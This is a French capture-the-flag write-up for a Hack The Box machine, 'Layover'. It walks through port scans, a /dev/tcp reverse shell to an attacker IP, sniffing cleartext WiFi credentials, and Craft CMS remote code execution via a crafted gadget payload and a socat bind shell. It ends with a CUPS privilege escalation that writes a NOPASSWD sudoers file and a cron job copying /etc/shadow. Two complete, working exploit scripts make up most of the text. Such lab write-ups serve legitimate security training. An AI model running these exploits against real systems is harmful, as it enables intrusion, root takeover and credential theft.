  # Layover

	echo "10.129.113.26 layover.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.113.26 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.113.26 -oN nmap.txt

Scans classiques.

	Not shown: 65461 closed tcp ports (reset)
	PORT      STATE    SERVICE       REASON         VERSION
	22/tcp    open     ssh           syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
	3389/tcp  open     ms-wbt-server syn-ack ttl 62 Microsoft Terminal Service

Compte fourni : contractor / Contractor2026!

	xfreerdp /u:contractor /p:'Contractor2026!' /v:10.129.113.26 /cert:ignore +clipboard /gdi:sw -rfx -gfx /size:1024x768 /network:lan

Shell plus propre parce que le RDP est chiant : 
```
bash -i >& /dev/tcp/10.10.14.31/4444 0>&1
[...]
nc -nvlp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

En fouillant la machine, on trouve des interfaces WiFi virtuelles (wlan2, wlan3) créées par le module noyau mac80211_hwsim, qui simule du matériel WiFi.

	iwconfig
	nmcli dev wifi list

Un SSID ouvert apparaît : HTB International WiFi. On s'y connecte avec wlan2 pour avoir une interface normale (DHCP + DNS internes assignés automatiquement) :

	nmcli dev wifi connect "HTB International WiFi" ifname wlan2

La connexion attribue une IP dans le sous-réseau interne 10.13.37.0/24, avec un DNS interne qui résout correctement *.international.htb donc inutile de bricoler /etc/hosts.

Pour récupérer des identifiants transitant sur ce réseau non chiffré, on passe wlan3 en mode moniteur sur le canal 6 et on sniffe avec tshark :

	airmon-ng start wlan3 6
	tshark -i wlan3 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value

Après quelques instants, une connexion automatisée au portail interne passe en clair.

Le portail interne (portal.international.htb, résolu en 10.13.37.10 via le DNS interne du WiFi) tourne sous Craft CMS 5.9.8 (Yii2), confirmé par les headers. Cette version reste vulnérable après le patch officiel de CVE-2026-28695 : le fix ne restreint que la création d'objets aux sous-classes de yii\base\BaseObject, mais yii\behaviors\AttributeTypecastBehavior EN est une et atteint tout de même un sink call_user_func(). Passer par l'action element-search (non-Twig) contourne aussi CRAFT_ENABLE_TWIG_SANDBOX.

Exploit public (script exploit.py) :

Voir : https://github.com/gbuyssens/CVE-2026-28695-craft-rce-bypass

Contraintes : authentification requise, exécution blind (toujours HTTP 500, aucune sortie renvoyée), et les commandes passent par escapeshellcmd() côté serveur donc on utilise socat pour un bind shell plutôt qu'un reverse shell (pour éviter les métacaractères) :

	python3 exploit.py http://portal.international.htb -u jenny -p 'Fl1ghtDeck2026!' --check
	python3 exploit.py http://portal.international.htb -u jenny -p 'Fl1ghtDeck2026!' --bind 4445
	nc 10.13.37.10 4445

On récupère un shell en tant qu'utilisateur web :

	cat /var/www/portal/.env

Le décodage donne CRAFT_SECURITY_KEY. Avec l'accès de Jenny sur l'admin Craft, on télécharge un dump SQL contenant la table htbairways_settings, où un mot de passe chiffré pour aporter est stocké. Notre CRAFT_SECURITY_KEY permet de le déchiffrer :

	ssh aporter@10.13.37.10
	cat ~/user.txt

## Élévation de privilèges

	ss -tulpn

Le service CUPS écoute en local sur 127.0.0.1:631, en version 2.4.16, vulnérable à une LPE (CVE-2026-34990) :

1. cupsd, en tant que client IPP coercé vers un serveur rogue local, répond à un challenge 401 WWW-Authenticate: Local en rejouant son propre token admin.
2. Avec ce token, on crée une queue d'impression persistante (printer-is-temporary=false, contourne la policy FileDevice) avec device-uri=file:///etc/sudoers.d/.
3. Un Print-Job brut (gzippé) envoyé à cette queue fait écrire cupsd (en root) directement le contenu voulu dans le fichier cible.

Voir : https://github.com/gbuyssens/CVE-2026-34990

Script Python stdlib-only automatisant toute la chaîne (voir cups_exploit.py) :

	python3 cups_exploit.py
	sudo -n id

Fin de l'exploitation : 

	sudo -n /bin/bash
	whoami
	cat /root/root.txt

Déroulé interne du script :
1. Faux serveur IPP sur 127.0.0.1:9189 répondant 401 Local.
2. CUPS-Create-Local-Printer avec device-uri pointant vers ce faux serveur → cupsd s'y connecte et fuite son token.
3. Capture du token Authorization: Local.
4. Création d'une queue permanente avec device-uri=file:///etc/sudoers.d/<user>-pwn.
5. Print-Job gzippé contenant : <user> ALL=(ALL) NOPASSWD: ALL.
6. Fallback automatique sur /etc/cron.d si le sudoers ne prend pas immédiatement.

---

### cups_exploit.py

	#!/usr/bin/env python3
	"""
	CVE-2026-34990 — CUPS local privilege escalation (cups2root, de-harnessed)

	cupsd tourne en root et, coercé à agir en client IPP vers un serveur rogue
	local, répond à un challenge 401 WWW-Authenticate: Local en rejouant son
	propre token admin. Capturer ce token permet à un utilisateur local non
	privilégié de piloter cupsd en root. Créer une queue d'impression
	persistante file:// (printer-is-temporary=false) contourne la policy
	FileDevice, donc un Print-Job brut écrit du contenu arbitraire en root —
	ici un fragment sudoers NOPASSWD.

	PoC public cups2root (GHSA-c54j-2vqw-wpwp, R. de Jager), stdlib only.

	Usage:
	  python3 cups_exploit.py
	  ATTACKER=aporter python3 cups_exploit.py
	"""

	import getpass, gzip, os, socket, struct, subprocess, sys, threading, time

	ATTACKER                   = os.environ.get("ATTACKER") or getpass.getuser()
	CAPTURE_HOST, CAPTURE_PORT = os.environ.get("CAPTURE_HOST", "127.0.0.1"), int(os.environ.get("CAPTURE_PORT", "9189"))
	IPP_HOST, IPP_PORT         = os.environ.get("IPP_HOST", "127.0.0.1"), int(os.environ.get("IPP_PORT", "631"))
	SUDOERS_PATH               = os.environ.get("SUDOERS_PATH", f"/etc/sudoers.d/{ATTACKER}-pwn")
	CRON_PATH                  = os.environ.get("CRON_PATH", f"/etc/cron.d/{ATTACKER}-pwn")

	T_OP, T_PRINTER, T_END = 0x01, 0x04, 0x03
	T_INT, T_BOOL, T_NAME, T_KEYWORD = 0x21, 0x22, 0x42, 0x44
	T_URI, T_CHARSET, T_LANG, T_MIME = 0x45, 0x47, 0x48, 0x49
	OP_PRINT_JOB, OP_RESUME_PRINTER = 0x0002, 0x0011
	OP_ADD_MODIFY_PRINTER, OP_ACCEPT_JOBS, OP_CREATE_LOCAL_PRINTER = 0x4003, 0x4008, 0x4028

	def a(tag, name, val):
	    n, v = name.encode(), val.encode()
	    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v

	def a_raw(tag, name, v):
	    n = name.encode()
	    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v

	def ab(name, val):
	    return a_raw(T_BOOL, name, b"\x01" if val else b"\x00")

	def req(op, rid, oa, pa=None, doc=b""):
	    p = bytearray(struct.pack(">BBHI", 2, 0, op, rid))
	    p.append(T_OP)
	    for x in oa:
	        p.extend(x)
	    if pa:
	        p.append(T_PRINTER)
	        for x in pa:
	            p.extend(x)
	    p.append(T_END)
	    p.extend(doc)
	    return bytes(p)

	def post(res, body, auth=None, timeout=4.0):
	    h = [f"POST {res} HTTP/1.1", f"Host: {IPP_HOST}:{IPP_PORT}", "Content-Type: application/ipp",
	         f"Content-Length: {len(body)}", "Connection: close"]
	    if auth:
	        h.append(f"Authorization: Local {auth}")
	    r = ("\r\n".join(h) + "\r\n\r\n").encode("latin1") + body
	    with socket.create_connection((IPP_HOST, IPP_PORT), timeout=timeout) as s:
	        s.settimeout(timeout)
	        s.sendall(r)
	        buf = bytearray()
	        while b"\r\n\r\n" not in buf:
	            c = s.recv(65536)
	            if not c:
	                break
	            buf.extend(c)
	        hh, _, rest = bytes(buf).partition(b"\r\n\r\n")
	        cl = 0
	        for ln in hh.split(b"\r\n"):
	            if ln.lower().startswith(b"content-length:"):
	                cl = int(ln.split(b":", 1)[1].strip())
	        pl = bytearray(rest)
	        while len(pl) < cl:
	            c = s.recv(65536)
	            if not c:
	                break
	            pl.extend(c)
	        sl = hh.split(b"\r\n", 1)[0].split()
	        return (int(sl[1]) if len(sl) > 1 else 0), bytes(pl[:cl] if cl else pl)

	def st(p):
	    return struct.unpack(">H", p[2:4])[0] if len(p) >= 4 else -1

	def common():
	    return [a(T_CHARSET, "attributes-charset", "utf-8"),
	            a(T_LANG, "attributes-natural-language", "en"),
	            a(T_NAME, "requesting-user-name", ATTACKER)]

	def admin(tok, op, rid, name, pa=None):
	    c, p = post("/admin/", req(op, rid, common() + [a(T_URI, "printer-uri",
	               f"ipp://localhost:{IPP_PORT}/printers/{name}")], pa), auth=tok)
	    return c, st(p)

	def print_job(name, rid, payload):
	    c, p = post(f"/printers/{name}", req(OP_PRINT_JOB, rid,
	               common() + [a(T_URI, "printer-uri", f"ipp://localhost:{IPP_PORT}/printers/{name}"),
	                           a(T_MIME, "document-format", "application/vnd.cups-raw"),
	                           a(T_KEYWORD, "compression", "gzip"),
	                           a(T_NAME, "job-name", "pwn")], doc=gzip.compress(payload)))
	    return c, st(p)

	class Cap(threading.Thread):
	    """Faux serveur IPP : répond 401 Local, capture le token rejoué."""

	    def __init__(self, port):
	        super().__init__(daemon=True)
	        self.port, self.token = port, None

	    def run(self):
	        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	            s.bind((CAPTURE_HOST, self.port))
	            s.listen(5)
	            s.settimeout(0.2)
	            end = time.time() + 25
	            while time.time() < end and not self.token:
	                try:
	                    c, _ = s.accept()
	                except socket.timeout:
	                    continue
	                with c:
	                    d = b""
	                    c.settimeout(5)
	                    while b"\r\n\r\n" not in d:
	                        x = c.recv(4096)
	                        if not x:
	                            break
	                        d += x
	                    tok = None
	                    for ln in d.decode("latin1", "replace").splitlines():
	                        if ln.lower().startswith("authorization: local "):
	                            tok = ln.split(None, 2)[2]
	                    if tok:
	                        self.token = tok
	                        ipp = (b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
	                               b"\x47\x00\x12attributes-charset\x00\x05utf-8"
	                               b"\x48\x00\x1battributes-natural-language\x00\x02en\x03")
	                        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/ipp\r\nContent-Length: "
	                                   + str(len(ipp)).encode() + b"\r\nConnection: close\r\n\r\n" + ipp)
	                    else:
	                        c.sendall(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Local trc=\"y\"\r\n"
	                                  b"Content-Length: 0\r\nConnection: close\r\n\r\n")

	def drop(tok, tag, path, payload, tries=12):
	    """Crée une queue file:// vers `path` et imprime `payload` dedans en root."""
	    for i in range(tries):
	        name = f"{tag}{i}{time.time_ns() % 100000}"
	        c, s = admin(tok, OP_ADD_MODIFY_PRINTER, 100 + i, name, [
	            a(T_URI, "device-uri", f"file://{path}"),
	            a(T_NAME, "printer-name", name),
	            a(T_NAME, "ppd-name", "raw"),
	            ab("printer-is-temporary", False),
	            ab("printer-is-accepting-jobs", True),
	            a_raw(T_INT, "printer-state", struct.pack(">i", 3)),
	        ])
	        admin(tok, OP_ACCEPT_JOBS, 300 + i, name)
	        admin(tok, OP_RESUME_PRINTER, 400 + i, name)
	        pc, ps = print_job(name, 500 + i, payload)
	        print(f"    [{tag}] queue add 0x{s:04x} / print HTTP {pc} 0x{ps:04x}", flush=True)
	        time.sleep(1.0)

	def is_root():
	    r = subprocess.run(["sudo", "-n", "/bin/sh", "-c", "id"], capture_output=True, text=True)
	    return r.returncode == 0, (r.stdout + r.stderr).strip()

	def leak_token():
	    """Coerce cupsd à se connecter au faux serveur et capture son token Local."""
	    cap = Cap(CAPTURE_PORT)
	    cap.start()
	    time.sleep(0.4)
	    body = req(OP_CREATE_LOCAL_PRINTER, 3,
	               common() + [a(T_URI, "printer-uri", f"ipp://localhost:{IPP_PORT}/")],
	               [a(T_NAME, "printer-name", "tokenleak"),
	                a(T_URI, "device-uri", f"ipp://{CAPTURE_HOST}:{CAPTURE_PORT}/ipp/print")])
	    raw = (f"POST / HTTP/1.1\r\nHost: {IPP_HOST}:{IPP_PORT}\r\nContent-Type: application/ipp\r\n"
	           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode("latin1") + body
	    s = socket.create_connection((IPP_HOST, IPP_PORT), timeout=4)
	    s.sendall(raw)
	    s.settimeout(2)
	    try:
	        s.recv(4096)
	    except Exception:
	        pass
	    s.close()
	    cap.join(timeout=20)
	    return cap.token

	def main():
	    print("CVE-2026-34990 — CUPS local privilege escalation (cups2root, de-harnessed)")
	    print(f"[*] target user = {ATTACKER}  ::  cupsd = {IPP_HOST}:{IPP_PORT}")

	    tok = leak_token()
	    if not tok:
	        print("[-] no token captured — is cupsd running as root and reachable?")
	        return 1
	    print(f"[+] Local token: {tok}", flush=True)

	    print("[*] step 1: write sudoers fragment", flush=True)
	    drop(tok, "sw", SUDOERS_PATH, f"{ATTACKER} ALL=(ALL) NOPASSWD: ALL\n".encode())
	    ok, out = is_root()
	    print(f"[*] sudo -n id -> rc_ok={ok} :: {out}", flush=True)
	    if ok:
	        print("[+] ROOT via sudoers", flush=True)
	        return 0

	    print("[*] step 2: fallback /etc/cron.d", flush=True)
	    drop(tok, "cw", CRON_PATH,
	         f"* * * * * root cp /etc/shadow /tmp/shadow-{ATTACKER} 2>/dev/null; "
	         f"chmod 644 /tmp/shadow-{ATTACKER}\n".encode())
	    print("[*] waiting up to 90s for cron ...", flush=True)
	    for _ in range(90):
	        ok, out = is_root()
	        if ok:
	            print("[+] ROOT via sudoers (delayed)", flush=True)
	            return 0
	        if subprocess.run(["test", "-f", f"/tmp/shadow-{ATTACKER}"]).returncode == 0:
	            print(f"[+] cron payload executed (root-owned /tmp/shadow-{ATTACKER})", flush=True)
	            return 0
	        time.sleep(1)
	    print("[-] no root yet — window closed or system patched", flush=True)
	    return 1

	if __name__ == "__main__":
	    try:
	        sys.exit(main())
	    except Exception as e:
	        print(f"\n[-] Error: {e}")
	        sys.exit(1)

### exploit.py (CVE-2026-28695)

	#!/usr/bin/env python3
	import argparse, re, sys, time
	import requests
	from requests.packages.urllib3 import disable_warnings
	disable_warnings()

	UA = "Mozilla/5.0"

	def login(s, base, user, password):
	    r = s.get(base + "/admin/login", timeout=10, verify=False)
	    m = re.search(r'name="CRAFT_CSRF_TOKEN" value="([^"]+)"', r.text.replace('\\"', '"'))
	    if not m:
	        print("[-] no login CSRF token found — is this a Craft CP?")
	        sys.exit(1)
	    csrf = m.group(1)
	    s.post(base + "/index.php?p=admin/actions/users/login",
	           json={"CRAFT_CSRF_TOKEN": csrf, "loginName": user, "password": password},
	           headers={"X-CSRF-Token": csrf, "X-Requested-With": "XMLHttpRequest",
	                    "Accept": "application/json"}, timeout=10, verify=False)
	    r2 = s.get(base + "/admin/dashboard", timeout=10, verify=False)
	    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
	    if not m:
	        print(f"[-] login failed for '{user}' — check credentials")
	        sys.exit(1)
	    print(f"[+] authenticated as {user}")
	    return m.group(1)

	def payload(cmd, csrf):
	    return {
	        "elementType": "craft\\elements\\Category",
	        "siteId": 1,
	        "search": "",
	        "condition": {
	            "class": "craft\\elements\\conditions\\ElementCondition",
	            "elementType": "craft\\elements\\Category",
	            "fieldLayouts": [{
	                "as rce": {
	                    "__class": "yii\\behaviors\\AttributeTypecastBehavior",
	                    "__construct()": [{
	                        "attributeTypes": {
	                            "typecastBeforeSave": ["Psy\\Readline\\Hoa\\ConsoleProcessus", "execute"]
	                        },
	                        "typecastBeforeSave": cmd,
	                    }],
	                },
	                "on *": "self::beforeSave",
	            }],
	        },
	        "CRAFT_CSRF_TOKEN": csrf,
	    }

	def rce(s, base, csrf, cmd, timeout=20):
	    t0 = time.time()
	    try:
	        r = s.post(base + "/index.php?p=admin/actions/element-search/search",
	                   json=payload(cmd, csrf),
	                   headers={"X-CSRF-Token": csrf, "X-Requested-With": "XMLHttpRequest",
	                            "Accept": "application/json"}, timeout=timeout, verify=False)
	        return r.status_code, time.time() - t0
	    except requests.exceptions.ReadTimeout:
	        return None, time.time() - t0

	def check(s, base, csrf):
	    print("[*] baseline (true) ...")
	    _, base_t = rce(s, base, csrf, "true")
	    print(f"    t+{base_t:.2f}s")
	    print("[*] sleep 5 ...")
	    _, sleep_t = rce(s, base, csrf, "sleep 5")
	    print(f"    t+{sleep_t:.2f}s")
	    delta = sleep_t - base_t
	    if delta > 3.5:
	        print(f"[+] RCE CONFIRMED — +{delta:.2f}s injected latency")
	        return True
	    print(f"[-] no measurable delay (+{delta:.2f}s)")
	    return False

	def bind_shell(s, base, csrf, port):
	    cmd = f"setsid socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh"
	    print(f"[*] planting bind shell: {cmd}")
	    st, el = rce(s, base, csrf, cmd, timeout=8)
	    print(f"[*] fired (HTTP {st}, t+{el:.2f}s)")
	    host = re.sub(r"^https?://", "", base).split("/")[0].split(":")[0]
	    print(f"[+] connect:  nc {host} {port}")

	def main():
	    ap = argparse.ArgumentParser()
	    ap.add_argument("target")
	    ap.add_argument("command", nargs="?")
	    ap.add_argument("-u", "--user", default="User")
	    ap.add_argument("-p", "--password", default="SecureP4$$!")
	    ap.add_argument("--check", action="store_true")
	    ap.add_argument("--bind", nargs="?", type=int, const=4445, metavar="PORT")
	    args = ap.parse_args()
	    base = args.target.rstrip("/")
	    s = requests.Session()
	    s.headers.update({"User-Agent": UA})
	    csrf = login(s, base, args.user, args.password)
	    if args.check:
	        sys.exit(0 if check(s, base, csrf) else 1)
	    if args.bind is not None:
	        bind_shell(s, base, csrf, args.bind)
	        return
	    if args.command:
	        st, el = rce(s, base, csrf, args.command)
	        print(f"[*] fired '{args.command}' — HTTP {st} (blind, t+{el:.2f}s)")
	        return
	    ap.print_help()

	if __name__ == "__main__":
	    main()
